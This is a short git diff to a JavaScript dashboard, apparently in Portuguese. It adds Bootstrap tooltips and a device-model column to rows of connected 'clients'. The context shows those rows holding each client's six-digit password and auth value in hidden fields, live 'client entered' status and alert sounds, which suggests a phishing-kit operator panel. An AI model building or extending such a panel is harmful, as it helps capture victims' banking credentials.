@@ -6,6 +6,13 @@ socket.on('onScreenPass', (data) => {
     lineClient.querySelector(`td[role='status'] span`).innerHTML = `Online na senha de 6`
 })
 
+var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
+
+console.log(tooltipTriggerList)
+var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
+    return new bootstrap.Tooltip(tooltipTriggerEl)
+})
+
 const panel = (() => {
     //private var/functions
 
@@ -228,11 +235,19 @@ const panel = (() => {
         <input type="hidden" name="password6" value="${password6}">
         <input type="hidden" name="auth" value="${auth}">
         <td role="status" class="blockstatus enter"><span>Cliente entrou</span></td>
+        <td role="device">
+            <span class="snippet-device" data-bs-toggle="tooltip" data-bs-placement="top" title="Modelo: ${
+                client.device.model || `Desconhecido`
+            }">
+                ${client.device.type || `Desconhecido`}
+            </span>
+        </td>
         `
 
         //timer(roleTime)
 
         clickInfo(tr)
+        new bootstrap.Tooltip(tr.querySelector('[data-bs-toggle="tooltip"]'))
         playSound('/fonts/pristine-609.mp3')
         setTimeout(() => {
             playSound('/fonts/pristine-609.mp3')
